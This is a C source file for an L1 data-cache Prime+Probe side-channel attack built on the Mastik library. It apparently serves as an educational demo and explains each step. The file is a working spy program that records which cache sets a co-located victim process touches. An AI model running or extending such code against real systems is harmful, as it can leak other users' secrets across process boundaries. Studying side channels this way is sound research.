/*
 * attack2_prime_probe.c  —  L1 Prime+Probe side-channel attack
 * ─────────────────────────────────────────────────────────────────────────────
 *
 * WHAT IT DOES:
 *   Captures which L1-D cache sets a victim process touches, revealing its
 *   memory access pattern — without sharing any memory with it.
 *
 * HOW PRIME+PROBE WORKS (via Mastik's l1_probe):
 *   1. PRIME:  Spy fills all 64 L1 cache sets with its own data.
 *   2. WAIT:   Victim runs for one time slot (slot_cycles).
 *   3. PROBE:  Spy re-reads each cache set and times it:
 *        Fast (~80 cycles)  → spy's data still there → victim did NOT use that set
 *        Slow (400+ cycles) → spy's data was evicted  → victim DID use that set
 *   NOTE: Mastik's l1_probe() does Prime+Probe in ONE call.
 *
 * BUILD:
 *   gcc -O0 -g -o attack2_prime_probe attack2_prime_probe.c \
 *       -I/home/claude/Mastik -L/home/claude/Mastik/src -lmastik
 *
 * RUN (two terminals):
 *   Terminal 1:  LD_LIBRARY_PATH=/home/claude/Mastik/src ./attack2_prime_probe
 *   Terminal 2:  ls -la /usr/bin    ← any active process
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <mastik/l1.h>
#include <mastik/util.h>
#include <mastik/low.h>

#define NUM_SAMPLES    50       /* how many prime+probe rounds to run        */
#define THRESHOLD      400      /* cycles above this = eviction = victim hit */
#define SLOT_CYCLES    1000000  /* ~1ms per slot — victim runs in this window */

int main(void) {
    /* ── Initialise L1 Prime+Probe handle ──────────────────────────── */
    l1pp_t l1 = l1_prepare(NULL);
    if (!l1) {
        fprintf(stderr, "[!] l1_prepare() failed — needs x86-64 with rdtscp\n");
        return 1;
    }

    /* Get the set permutation map (Mastik randomises set order) */
    int rmap[64], map[64];
    int nsets = l1_getmonitoredset(l1, rmap, 64);
    for (int i = 0; i < nsets; i++)
        map[rmap[i]] = i;

    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║        ATTACK 2: L1-D Prime+Probe                   ║\n");
    printf("╠══════════════════════════════════════════════════════╣\n");
    printf("║ L1 cache sets monitored: %-28d║\n", nsets);
    printf("║ Eviction threshold      : %d cycles                ║\n", THRESHOLD);
    printf("║ Slot size               : %d cycles (~1ms)       ║\n", SLOT_CYCLES);
    printf("║ Samples                 : %-28d║\n", NUM_SAMPLES);
    printf("╚══════════════════════════════════════════════════════╝\n\n");
    printf("[spy] Run a program in another terminal. Monitoring now...\n\n");

    /* Allocate results: NUM_SAMPLES rows × nsets cols */
    uint16_t *results = calloc(NUM_SAMPLES * nsets, sizeof(uint16_t));

    /* ── Run NUM_SAMPLES rounds of Prime+Probe ──────────────────────── */
    l1_repeatedprobe(l1, NUM_SAMPLES, results, SLOT_CYCLES);

    /* ── Print results: which sets were evicted each round ─────────── */
    for (int s = 0; s < NUM_SAMPLES; s++) {
        uint16_t *row = results + s * nsets;

        int evictions = 0;
        printf("Sample %3d: evicted sets = [ ", s + 1);
        for (int i = 0; i < nsets; i++) {
            /* map[i] gives the physical set index for column i */
            if (row[map[i]] > THRESHOLD) {
                printf("%d(%u) ", i, row[map[i]]);
                evictions++;
            }
        }
        printf("] total=%d\n", evictions);
        fflush(stdout);
    }

    printf("\n[spy] Done. Each evicted set = a cache set the victim used.\n");
    printf("[spy] Consistent sets across samples → victim's memory footprint.\n");
    l1_release(l1);
    free(results);
    return 0;
}
